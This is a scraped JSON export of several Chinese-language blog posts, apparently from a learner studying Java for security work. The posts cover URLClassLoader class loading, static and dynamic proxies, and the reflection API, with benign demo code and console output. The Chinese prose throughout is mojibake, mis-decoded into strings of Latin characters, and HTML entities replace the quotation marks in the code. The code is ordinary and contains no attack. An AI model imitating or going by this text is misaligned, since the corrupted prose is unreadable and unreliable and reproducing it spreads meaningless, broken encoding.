urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTestç±»åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } æ‰§è¡Œç»“æœä¸ºï¼š\n1 2 3 4 5 file:/E:/ file:/E:/ MyTestç±»åŠ è½½å™¨ä¸ºjava.net.URLClassLoader@24d46ca6 MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸ºnull è°ƒç”¨äº†æ— å‚æ„é€ å‡½æ•° å¯ä»¥çœ‹åˆ°è¿™é‡ŒæˆåŠŸå¤–éƒ¨åŠ è½½äº†å…¶ä»–çš„classæ–‡ä»¶ã€‚è¿™é‡Œè°ƒç”¨çš„æ„é€ å‡½æ•°ä¸ºï¼š\nå¯ä»¥çœ‹å‡ºæ¥ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯æŒ‡å®šçˆ¶ç±»çš„æ“ä½œï¼Œåœ¨å‰é¢çš„å­¦ä¹ åï¼Œè¿™é‡Œå°†å…¶è®¾ç½®ä¸ºnullå°±æ˜¯å°†å…¶è®¾ç½®ä¸ºå¯åŠ¨ç±»åŠ è½½å™¨çš„å­åŠ è½½å™¨ï¼Œå¾ˆå¥½ç†è§£ï¼Œç„¶åä¸ªäººç†è§£è¿™é‡Œè°ƒç”¨URLClassLoaderå°±æ˜¯ç”¨æ¥â€œåŠ¨æ€æ„é€ â€ä¸€ä¸ªClassLoaderï¼Œå¤§æ¦‚å°±æ˜¯è¿™æ ·ã€‚\nåŒæ ·çš„ï¼Œè¿˜å¯ä»¥ç›´æ¥å°†å…¶è®¾ç½®ä¸ºä¸€ä¸ªURLå¯¹è±¡ï¼Œå¦‚ä¸‹ä»£ç ï¼š\nMain.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ URL url = new URL(\u0026#34;file:/E:/\u0026#34;); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url},null); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTestç±»åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } è¾“å‡ºç»“æœä¸ºï¼š\n1 2 3 MyTestç±»åŠ è½½å™¨ä¸ºjava.net.URLClassLoader@24d46ca6 MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸ºnull è°ƒç”¨äº†æ— å‚æ„é€ å‡½æ•° æœ¬åœ°åŠ è½½æˆåŠŸï¼Œç½‘ç»œä¼ è¾“classæ–‡ä»¶æ˜¯å·®ä¸å¤šçš„ï¼Œåœ¨è¿™é‡Œå¯¹äºä¼ å‚ç±»å‹çœ‹æºç å¾ˆå®¹æ˜“çœ‹å‡ºæ¥ï¼Œè¿™é‡Œä¸å¤šè¯´ã€‚\nä½†æ˜¯æœ‰ä¸€ä¸ªç‚¹æ˜¯è¦è¯´æ˜çš„ï¼Œå¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ URL url = new URL(\u0026#34;file:/D:/\u0026#34;); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url},null); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTestç±»åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTestç±»çš„çˆ¶åŠ è½½å™¨ä¸º\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } æ²¡æœ‰è¾“å‡ºï¼Œè€Œæ˜¯æŠ¥é”™ï¼š\n1 2 3 4 5 Exception in thread \u0026#34;main\u0026#34; java.lang.ClassNotFoundException: MyTest at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java_foundation.Main.main(Main.java:11) æƒ³äº†ä¸€ä¸‹ï¼Œè¿™æ˜¯å› ä¸ºâ€æ–°å®šä¹‰â€œçš„URLClassLoaderåªæ˜¯å¯åŠ¨ç±»çš„å­åŠ è½½å™¨ï¼Œä½†æ˜¯å®ƒæ²¡æœ‰å­åŠ è½½å™¨ï¼Œè¿™é‡ŒDç›˜ä¸‹å¹¶æ²¡æœ‰MyTest.classæ–‡ä»¶ï¼Œè™½ç„¶classpathä¸­æœ‰ï¼Œä½†æ˜¯æ²¡æœ‰å­ç±»ï¼Œæ‰€ä»¥æ˜¯æ— æ³•è°ƒç”¨æˆåŠŸçš„ï¼Œå¯ä»¥å’Œå‰é¢çˆ¶ç±»çš„AppclassLoaderçš„ä»£ç å¯¹æ¯”ç†è§£ä¸€ä¸‹ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/t/12669?time__1311=GqGxuDRiD%3Dit%3DGN4eeqBKqAKKhQQdFD9WoD\nhttps://blog.csdn.net/yrk0556/article/details/105348968\nhttps://blog.csdn.net/qq_37205350/article/details/108805628\nhttps://blog.csdn.net/briblue/article/details/54973413\nhttps://blog.csdn.net/TJtulong/article/details/89598598\nhttps://blog.csdn.net/m0_45406092/article/details/108984101\nhttps://nivi4.notion.site/Java-cedccc0611654bd99f841de3ef578e24\n","date":"2024-06-19T22:54:06+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/","title":"Javaç±»åŠ è½½æœºåˆ¶"},{"content":"JavaåŠ¨æ€ä»£ç† åˆ©ç”¨äº†ä»£ç†æ¨¡å¼ï¼Œä¸€ä¸ªé€šä¿—æ˜“æ‡‚çš„è¯´æ³•ï¼šç»™æŸä¸€ä¸ªå¯¹è±¡æä¾›ä¸€ä¸ªä»£ç†ï¼Œå¹¶ç”±ä»£ç†å¯¹è±¡æ¥æ§åˆ¶å¯¹çœŸå®å¯¹è±¡çš„è®¿é—®ã€‚\nç®€å•è¯´æ˜ ä»£ç†æ¨¡å¼æ˜¯Javaä¸­å¸¸è§çš„è®¾è®¡æ¨¡å¼ã€‚\nå…¶ç‰¹å¾æ˜¯ä»£ç†ç±»å’Œå§”æ‰˜ç±»æœ‰åŒæ ·çš„æ¥å£ï¼Œä»£ç†ç±»ä¸»è¦è´Ÿè´£ä¸ºå§”æ‰˜ç±»é¢„å¤„ç†æ¶ˆæ¯ã€è¿‡æ»¤æ¶ˆæ¯ã€æŠŠä¿¡æ¯è½¬å‘ç»™å§”æ‰˜ç±»ï¼Œä»¥åŠäº‹åå¤„ç†æ¶ˆæ¯ç­‰ã€‚\nä»£ç†ç±»ä¸å§”æ‰˜ç±»ä¹‹é—´é€šå¸¸ä¼šå­˜åœ¨å…³è”å…³ç³»ï¼Œä¸€ä¸ªä»£ç†ç±»å¯¹è±¡ä¸ä¸€ä¸ªå§”æ‰˜ç±»å¯¹è±¡å…³è”ï¼Œä»£ç†ç±»å¯¹è±¡æœ¬èº«å¹¶ä¸çœŸæ­£å®ç°æœåŠ¡ï¼Œè€Œæ˜¯é€šè¿‡å§”æ‰˜ç±»å¯¹è±¡çš„ç›¸å…³æ–¹æ³•æ¥æä¾›ç‰¹å®šæœåŠ¡ã€‚\né™æ€ä»£ç† éœ€è¦ä»£ç†å¯¹è±¡å’Œç›®æ ‡å¯¹è±¡å®ç°åŒæ ·çš„æ¥å£ã€‚\n**ç¼ºç‚¹ï¼š**å½“éœ€è¦çš„ä»£ç†çš„å¯¹è±¡è¿‡å¤šå°±éœ€è¦å®ç°å¤§é‡çš„ä»£ç†ç±»ï¼Œå¹¶ä¸”å½“æ¥å£å¢åŠ æ–¹æ³•ï¼Œç›®æ ‡å¯¹è±¡ä¸ä»£ç†å¯¹è±¡éƒ½è¦è¿›è¡Œä¿®æ”¹\nç›´æ¥ç”¨å‚è€ƒæ–‡ç« çš„ä¸€ä¸ªdemoæ¥æ¼”ç¤ºä¸€ä¸‹ä»€ä¹ˆæ˜¯é™æ€ä»£ç†ï¼Œç†è§£ä¸€ä¸‹\nEvent.java:\n1 2 3 4 5 6 //æ¥å£ç±» package java_foundation; public interface Event { void sale(); } Text.java\n1 2 3 4 5 6 7 8 //å§”æ‰˜ç±» package java_foundation; public class Text implements Event { public void sale(){ System.out.println(\u0026#34;è¦å–æˆ¿å­äº†\u0026#34;); } } MyTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 //ä»£ç†ç±» package java_foundation; public class MyTest implements Event{ private Event instances; public MyTest(Event a){ this.instances = a; } public void sale(){ instances.sale(); System.out.println(\u0026#34;å”®ä»·2000å…ƒ\u0026#34;); } } æœ€ç»ˆçš„æµ‹è¯•ç±»ï¼šTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 //æµ‹è¯•ç±» package java_foundation; public class Main{ public static void main(String[] args) throws Exception{ System.out.println(\u0026#34;======ä½¿ç”¨ä»£ç†å‰====\u0026#34;); Text a = new Text(); a.sale(); System.out.println(\u0026#34;======ä½¿ç”¨ä»£ç†å====\u0026#34;); MyTest b = new MyTest(new Text()); b.sale(); } } åªè¦ææ¸…æ¥šå¯¹è±¡çš„å…³ç³»ï¼Œè¿™é‡Œçš„ä»£ç å°±ä¸éš¾ç†è§£äº†ã€‚æœ€åç»“æœå¦‚ä¸‹ï¼š\n1 2 3 4 5 ======ä½¿ç”¨ä»£ç†å‰==== è¦å–æˆ¿å­äº† ======ä½¿ç”¨ä»£ç†å==== è¦å–æˆ¿å­äº† å”®ä»·2000å…ƒ ä¹Ÿå°±æ˜¯å¯ä»¥å°†ä»£ç†è®¾æƒ³ä¸ºè¿™é‡Œå–æˆ¿å­çš„ä¸­ä»‹ï¼Œä¸­ä»‹æ¥ç»™ä½ å®šä¹‰å…·ä½“çš„å†…å®¹ï¼Œä½ åªéœ€è¦æŠŠå¤§ä½“çš„è¯´æ˜å°±è¡Œäº†ã€‚\næˆ‘ä»¬è¿™é‡Œæ˜¯ç”¨çš„æ¥å£ç±»ä½œä¸ºæ¥æ”¶å‚æ•°çš„ç±»å‹ï¼Œå¹¶ä¸”æ„é€ å‡½æ•°çš„æ¥æ”¶çš„å‚æ•°ç±»å‹ä¹Ÿéƒ½æ˜¯æ¥å£ç±»å‹ã€‚\næœ‰ä¸€ä¸ªç‚¹è¯´æ˜ä¸€ä¸‹ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆè¿™é‡Œè¦ä½¿ç”¨Eventæ¥å£ç±»å‹ä½œä¸ºåª’ä»‹å‘¢ï¼Œåº”è¯¥æ˜¯å› ä¸ºå§”æ‰˜ç±»å®ç°äº†Eventæ¥å£ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿å¾—ç›¸åº”çš„Text()å¯¹è±¡å¯ä»¥æˆä¸ºè¿™ä¸ªç±»å‹ï¼ŒåŒæ—¶ä»£ç†ç±»MyTestä¹Ÿæ¥å£äº†Eventæ¥å£ï¼Œæ‰€ä»¥MyTestç±»ä¹Ÿå¯ä»¥æ¥å—Eventç±»å‹çš„æ•°æ®ã€‚\nè¿™é‡Œæœ€é‡è¦çš„å®ç°ä»£ç†çš„æ“ä½œå°±æ˜¯ä»£ç†ç±»ä¸­çš„å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 public void sale(){ instances.sale(); System.out.println(\u0026#34;å”®ä»·2000å…ƒ\u0026#34;); } å°±æ˜¯å› ä¸ºè¿™ä¸²ä»£ç å¯¼è‡´çš„æœ€ç»ˆè¾“å‡ºä¸º\n1 2 è¦å–æˆ¿å­äº† å”®ä»·2000å…ƒ å› ä¸ºæˆ‘ä»¬newåå°†instanceå¯¹åº”åˆ°äº†å§”æ‰˜ç±»çš„å¯¹è±¡ï¼Œæ­¤æ—¶å°±ä¼šè°ƒç”¨Text.javaä¸­çš„sale()æ–¹æ³•ï¼Œæ‰€ä»¥å…¶å®ä¸€èˆ¬ä»£ç†ç±»çš„é‡è¦ä»£ç éƒ½ä¼šè°ƒç”¨ä¸¤æ¬¡ã€‚ç®€å•æµç¨‹å›¾å¦‚ä¸‹\nåŠ¨æ€ä»£ç† ä¸é™æ€ä»£ç†ç›¸åŒï¼Œéœ€è¦å…¬å…±æ¥å£ï¼Œå§”æ‰˜ç±»ï¼Œä»£ç†ç±»ã€‚åŒºåˆ«å°±æ˜¯åŠ¨æ€ä»£ç†æ˜¯åˆ©ç”¨åå°„æœºåˆ¶åœ¨è¿è¡Œæ—¶åˆ›å»ºä»£ç†ç±»ã€‚è¿™é‡Œéœ€è¦ç”¨åˆ°ä½äºJava.lang.reflectä¸‹çš„Proxyç±»ä¸InvocationHandleræ¥å£ã€‚\nInvocationHandleræ¥å£ï¼šè´Ÿè´£æä¾›è°ƒç”¨ä»£ç†çš„æ“ä½œ 1 2 3 4 public interface InvocationHandler { public Object invoke(Object proxy, Method method, Object[] args) throws Throwable; } å…¶ä¸­proxyä¸ºä»£ç†ç±»çš„å®ä¾‹å¯¹è±¡ï¼Œmethodè¡¨ç¤ºè°ƒç”¨çš„æ–¹æ³•åï¼Œargs[]ä¸ºè°ƒç”¨æ–¹æ³•çš„å‚æ•°æ•°ç»„\nè¿™ä¸ªæ¥å£å®šä¹‰äº†ä¸€ä¸ªinvoke()æ–¹æ³•ï¼Œæ¯ä¸ªä»£ç†å¯¹è±¡éƒ½æœ‰ä¸€ä¸ªå…³è”çš„æ¥å£ã€‚è¿™ä¸ªæ˜¯å¾ˆé‡è¦çš„ï¼šå½“ä»£ç†å¯¹è±¡ä¸Šè°ƒç”¨ä»»æ„æ–¹æ³•æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è½¬å‘åˆ°InvocationHandler.invoke()æ–¹æ³•è¿›è¡Œè°ƒç”¨\nProxyç±»ï¼šè´Ÿè´£åŠ¨æ€æ„å»ºä»£ç†ç±» ä½äºjava.lang.reflect.Proxyï¼Œæä¾›äº†é™æ€æ–¹æ³•ç”¨äºå¾—åˆ°ä»£ç†å¯¹è±¡\n1 public static Object newProxyInstance(ClassLoader loader,Class\u0026lt;?\u0026gt;[] interfaces,InvocationHandler h)throws IllegalArgumentException{} ç»§ç»­ä½¿ç”¨å‰é¢çš„é‚£ä¸ªä¾‹å­ï¼Œç»“åˆä»£ç ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦è·å¾—ç±»åŠ è½½å™¨ï¼Œç›¸å¯¹åº”çš„æ–¹æ³•ï¼Œç›´æ¥ç»™ä»£ç ï¼š\nå§”æ‰˜ç±»å’Œæ¥å£ä¸å˜ï¼Œ\nText.java:\n1 2 3 4 5 6 7 8 //å§”æ‰˜ç±» package java_foundation; public class Text implements Event { public void sale(){ System.out.println(\u0026#34;è¦å–æˆ¿å­äº†\u0026#34;); } } Event.javaï¼š\n1 2 3 4 5 6 //æ¥å£ç±» package java_foundation; public interface Event { void sale(); } çœ‹å…¶ä»–éœ€è¦ä¿®æ”¹çš„ä»£ç ï¼š\nMyTest.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //åŠ¨æ€è·å–ä»£ç†çš„ä»£ç†ç±» package java_foundation; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class MyTest implements InvocationHandler{ private Object instances; public MyTest(Object a){ this.instances = a; } //é‡å†™invoke()æ–¹æ³• public Object invoke(Object proxy, Method method, Object[] args) throws Throwable{ System.out.println(\u0026#34;å”®ä»·2000å…ƒ\u0026#34;); Object result = method.invoke(instances,args); return result; } } åœ¨è¿™ä¸ªä»£ç†ç±»é‡å†™çš„invoke()æ–¹æ³•ä¸­ï¼Œçœ‹åˆ°äº†å¾ˆç†Ÿæ‚‰çš„æ“ä½œï¼Œè°ƒç”¨æ–¹æ³•ï¼Œå¯¹ï¼Œå°±æ˜¯è°ƒç”¨äº†invoke()æ–¹æ³•ï¼Œç»“åˆåœ¨å‰é¢è¯´æ˜InvocationHandleræ¥å£ç±»æ—¶ï¼Œå¤§æ¦‚ä¹…èƒ½çŸ¥é“è¿™é‡Œçš„è°ƒç”¨é€»è¾‘ã€‚åé¢çœ‹äº†ç»“æœå°±çŸ¥é“äº†ã€‚\nMain.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 //æµ‹è¯•ç±» package java_foundation; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception{ //è·å–å§”æ‰˜ç±»çš„å®ä¾‹å¯¹è±¡ Text text = new Text(); //è·å–CalssLoader ClassLoader classLoader = text.getClass().getClassLoader(); //è·å–æ‰€æœ‰æ¥å£ Class[] interfaces = text.getClass().getInterfaces(); //è·å–ä¸€ä¸ªè°ƒç”¨å¤„ç†å™¨ InvocationHandler invocatinoHandler = new MyTest(text); //åˆ›å»ºä»£ç†å¯¹è±¡ Event proxy = (Event)Proxy.newProxyInstance(classLoader,interfaces,invocatinoHandler); proxy.sale(); } } æˆåŠŸè¾“å‡º\n1 2 å”®ä»·2000å…ƒ è¦å–æˆ¿å­äº† å¤§æ¦‚å°±æ˜¯è¿™è¿™æ ·ï¼Œå…¶å®ç†è§£ä¸€ä¸‹å°±è¡Œäº†ï¼Œéš¾åº¦ä¸æ˜¯å¾ˆé«˜ï¼Œé‡ç‚¹å…³æ³¨invoke()ä¸­çš„ä»£ç ã€‚\nï¼ˆå‚è€ƒæ–‡ç« æœ‰ä¸€é“é¢˜ï¼Œåé¢å¯ä»¥å­¦ä¹ ä¸€ä¸‹ï¼‰\nå‚è€ƒæ–‡ç« ï¼š\nhttps://xz.aliyun.com/t/9197?time__1311=n4%2BxuDgD9DyDnB7QGQD%2FD0WoQ4D55i%3D31YNGt4D\nhttps://blog.csdn.net/DDDYSz/article/details/109451049\nhttps://tttang.com/archive/1769/\nhttps://www.cnblogs.com/whirly/p/10154887.html\n","date":"2024-06-19T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","title":"JavaåŠ¨æ€ä»£ç†"},{"content":"Javaåå°„æœºåˆ¶ Javaåå°„ï¼ˆReflectionï¼‰æ˜¯Javaéå¸¸é‡è¦çš„åŠ¨æ€ç‰¹æ€§**ï¼Œé€šè¿‡ä½¿ç”¨åå°„æˆ‘ä»¬å¯ä»¥è·å–åˆ°ä»»ä½•ç±»çš„æˆå‘˜æ–¹æ³•ï¼ˆMethodsï¼‰ã€æˆå‘˜å˜é‡ï¼ˆFieldsï¼‰ã€æ„é€ æ–¹æ³•ï¼ˆConstructorsï¼‰ç­‰ä¿¡æ¯ï¼Œè¿˜å¯ä»¥åŠ¨æ€åˆ›å»ºJavaå®ä¾‹ã€è°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³•ã€ä¿®æ”¹ä»»æ„çš„ç±»æˆå‘˜å˜é‡å€¼ç­‰**ã€‚\nè¿™æ˜¯ä¸€ä¸ªé‡è¦çš„æœºåˆ¶ï¼Œå¯ä»¥ç»•è¿‡javaç§æœ‰è®¿é—®æƒé™æ£€æŸ¥ï¼Œåå°„è·å–å¹¶è°ƒç”¨ç§æœ‰çš„ç±»ä»è€Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\næœ¬åœ°JDKæµ‹è¯•ç‰ˆæœ¬ï¼š\nJDK 8u71 æœ€å¥½æ˜¯æ­å»ºä¸€ä¸ªmavené¡¹ç›®æ¥å­¦ä¹ ï¼Œè¿™æ ·æ›´å¥½æ·»åŠ ä¾èµ–ã€‚\nåå°„æœºåˆ¶æµç¨‹ å½“æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç±»æ–‡ä»¶ï¼Œç»è¿‡javacç¼–è¯‘ä¹‹åï¼Œå°±ä¼šå½¢æˆ.classæ–‡ä»¶ï¼ŒåŒæ—¶JVMå†…å­˜ä¼šæŸ¥æ‰¾ç”Ÿæˆçš„.classæ–‡ä»¶è¯»å…¥å†…å­˜å’Œç»è¿‡ClassLoaderåŠ è½½ï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨åˆ›å»ºç”Ÿæˆä¸€ä¸ªClasså¯¹è±¡ï¼Œé‡Œé¢æ‹¥æœ‰å…¶è·å–çš„æˆå‘˜å˜é‡ï¼Œæˆå‘˜æ–¹æ³•ï¼Œå’Œæ„é€ æ–¹æ³•ç­‰ã€‚\nJVMä¸ºæ¯ä¸ªåŠ è½½çš„classåˆ›å»ºäº†å¯¹åº”çš„Classå®ä¾‹ï¼Œå¹¶åœ¨å®ä¾‹ä¸­ä¿å­˜äº†è¯¥classçš„æ‰€æœ‰ä¿¡æ¯ã€‚è·å–äº†æŸä¸ªClasså®ä¾‹ï¼Œå°±å¯ä»¥é€šè¿‡è¿™ä¸ªClasså®ä¾‹è·å–åˆ°è¯¥å®ä¾‹å¯¹åº”çš„classçš„æ‰€æœ‰ä¿¡æ¯\nåå°„å¸¸ç”¨çš„åŒ…å’Œç±» åå°„æœºåˆ¶ç›¸å…³æ“ä½œä¸€èˆ¬ä½äº java.lang.reflect åŒ…ä¸­\néœ€è¦æ³¨æ„çš„ç±»ï¼š\n1 2 3 4 java.lang.Classï¼šç±»å¯¹è±¡ java.lang.reflect.Constructorï¼šç±»çš„æ„é€ å™¨å¯¹è±¡ java.lang.reflect.Fieldï¼šç±»çš„å±æ€§å¯¹è±¡ java.lang.reflect.Methodï¼šç±»çš„æ–¹æ³•å¯¹è±¡ åå°„å¸¸è§ä½¿ç”¨çš„æ–¹æ³• è·å–ç±»çš„æ–¹æ³•ï¼šforName\nå®ä¾‹åŒ–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼šnewInstance\nè·å–å‡½æ•°çš„æ–¹æ³•ï¼šgetMethod\næ‰§è¡Œå‡½æ•°çš„æ–¹æ³•ï¼šinvoke\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™äº›æ–¹æ³•æ¥è·å¾—å…¶ä»–ç±»çš„å„ç§å±æ€§å’Œæ–¹æ³•\nè·å–classå¯¹è±¡ forNameä¸æ˜¯è·å–â€œç±»â€çš„å”¯ä¸€é€”å¾„ï¼Œé€šå¸¸æ¥è¯´è¿˜æœ‰ä¸‹é¢ä¸‰ç§åˆ©ç”¨java.lang.Classå¯¹è±¡çš„æ–¹å¼æ¥è·å–ä¸€ä¸ªâ€œç±»â€\nè·å–Classå¯¹è±¡çš„ä¸‰ç§æ–¹å¼ï¼š\nClass.forName(\u0026ldquo;å…¨ç±»å\u0026rdquo;) ï¼šå°†å­—èŠ‚ç æ–‡ä»¶åŠ è½½è¿›å†…å­˜ï¼Œè¿”å›Classå¯¹è±¡ å¤šç”¨äºé…ç½®æ–‡ä»¶ï¼Œå°†ç±»åå®šä¹‰åœ¨é…ç½®æ–‡ä»¶ä¸­ã€‚è¯»å–æ–‡ä»¶ï¼ŒåŠ è½½ç±»ã€‚\nç±»å.class ï¼šé€šè¿‡ç±»åçš„å±æ€§classè·å– å¤šç”¨äºå‚æ•°çš„ä¼ é€’\nå¯¹è±¡.getClass() ï¼šgetClass()æ–¹æ³•å®šä¹‰äºObjectç±»ä¸­,å¹¶ä¸”éœ€è¦å…ˆå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹è¦è¯´æ˜ã€‚å¦‚æœä¸æ˜¯ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œè€Œæ˜¯ä¸€ä¸ªclasså¯¹è±¡ï¼Œé‚£ä¹ˆéƒ½ä¼šè¿”å›class java.lang.Classï¼ŒåŒæ ·çš„ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªæ–¹æ³•çš„classå¯¹è±¡ï¼Œé‚£ä¹ˆè¿”å›çš„ä¼šæ˜¯class java.lang.reflect.Methodï¼Œæ³¨æ„åŒºåˆ†è¾¨åˆ«ã€‚ classloader.loadClass()ï¼šè¿™æ˜¯é€šè¿‡ç±»åŠ è½½å™¨æ¥åŠ è½½ç±»ï¼Œè¿™ä¸ªæ¿å—ä¸è¯´ï¼Œåé¢åˆ°ç±»åŠ è½½å™¨å†äº†è§£ã€‚ å¤šç”¨äºå¯¹è±¡çš„è·å–å­—èŠ‚ç çš„æ–¹å¼\n\u0026mdash;-â€”â€”â€”â€”\nç»™ä¸€ä¸ªä»£ç æ¥æ¼”ç¤ºä¸€ä¸‹è·å–Classå¯¹è±¡çš„ä¸‰ç§æ–¹å¼ï¼š\nç›®å½•ç»“æ„ä¸ºï¼š\ndemoï¼šReflection.java 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; public class Reflection { private String name; protected String sex; public int age = 222; public int getAge(){ return this.age; } public void setName(String name){ this.name=name; } public String getName(){ return this.name; } } æ‰§è¡Œä»£ç æ•ˆæœï¼šMain.javaï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package java_foundation; import java.lang.Class; public class Main { public static void main(String[] args) throws Exception{ //æ–¹æ³•ä¸€ï¼š Class clazz = Class.forName(\u0026#34;java_foundation.Reflection\u0026#34;); Reflection reflection = (Reflection)clazz.newInstance();//å®ä¾‹åŒ–å¯¹è±¡ reflection.setName(\u0026#34;fupanc\u0026#34;); System.out.println(reflection.getName()); //æ–¹æ³•äºŒ Class clazz1 = Reflection.class; Reflection reflection1 = (Reflection)clazz1.newInstance(); reflection1.setName(\u0026#34;fupanc1\u0026#34;); System.out.println(reflection1.getName()); //æ–¹æ³•ä¸‰ Reflection reflection2 = new Reflection(); Class clazz2 = reflection2.getClass(); Reflection reflection3 = (Reflection)clazz2.newInstance(); System.out.println(reflection3.getAge()); //å…¶ä»–è¯´æ˜ Class reflection5 = Reflection.class; System.out.println(reflection5.getClass()); System.out.println(reflection5.getName()); } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 fupanc fupanc1 222 class java.lang.Class java_foundation.Reflection å¯ä»¥æ¸…æ¥šæ˜ç™½åœ°çœ‹å‡ºè¿™é‡Œçš„å·®åˆ«ï¼Œé‡è¦çš„æ˜¯ï¼Œå­¦ä¹ javaä¸€å®šè¦æœ‰å¯¹è±¡çš„æ¦‚å¿µã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è·å–classå¯¹è±¡ä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨Class.forNameæ–¹æ³•å»è·å–ï¼Œå…¶ä»–ä¸¤ä¸ªéƒ½æœ‰ä¸€å®šçš„é™åˆ¶ã€‚\nå¦å¤–çš„ä¸€ä¸ªç‚¹éœ€è¦è¯´æ˜\nforNameæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š\nClass\u0026lt;?\u0026gt; forName(String name)\nClass\u0026lt;?\u0026gt; forName(String name, **boolean** initialize, ClassLoader loader)\nç¬¬â¼€ä¸ªå°±æ˜¯æˆ‘ä»¬æœ€å¸¸â»…çš„è·å–classçš„â½…å¼ï¼Œå…¶å®å¯ä»¥ç†è§£ä¸ºç¬¬â¼†ç§â½…å¼çš„â¼€ä¸ªå°è£…ï¼š\n1 2 3 Class.forName(className) // ç­‰äº Class.forName(className, true, currentLoader) é»˜è®¤æƒ…å†µä¸‹ï¼Œ forName çš„ç¬¬â¼€ä¸ªå‚æ•°æ˜¯ç±»åï¼›ç¬¬â¼†ä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯ ClassLoader ã€‚\nå¯¹äºç¬¬äºŒä¸ªå‚æ•°ï¼Œå¯ä»¥å°†å…¶ç†è§£ä¸ºå¯¹ä¸€ä¸ªç±»çš„åˆå§‹åŒ–ï¼Œæ„é€ å‡½æ•°å¹¶ä¸ä¼šæ‰§è¡Œï¼Œçœ‹å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package java_foundation; import java.lang.Class; public class Main { public static void main(String[] args) throws Exception{ Class clazz = Class.forName(\u0026#34;java_foundation.Test\u0026#34;); } } class Test{ { System.out.println(\u0026#34;ç›´æ¥è°ƒç”¨çš„{}\u0026#34;); } static{ System.out.println(\u0026#34;ç›´æ¥è°ƒç”¨çš„static\u0026#34;); } public Test(){ System.out.println(\u0026#34;è°ƒç”¨äº†ç±»çš„æ„é€ å‡½æ•°\u0026#34;); } } è¾“å‡ºç»“æœä¸ºï¼š\n1 ç›´æ¥è°ƒç”¨çš„static è¿™æ ·å°±å¯ä»¥å¾ˆå®¹æ˜“åœ°çœ‹å‡ºâ€œç±»çš„åˆå§‹åŒ–\u0026quot;è°ƒç”¨çš„æ˜¯static {}ï¼Œç„¶åå½“æˆ‘å°è¯•Test test = new Test();è¿™æ ·æ˜¾å¼åœ°åˆå§‹åŒ–æ—¶ï¼Œå¯ä»¥å‘ç°è°ƒç”¨é¡ºåºæ˜¯ï¼šstatic{} ==ã€‹{} ==ã€‹æ„é€ 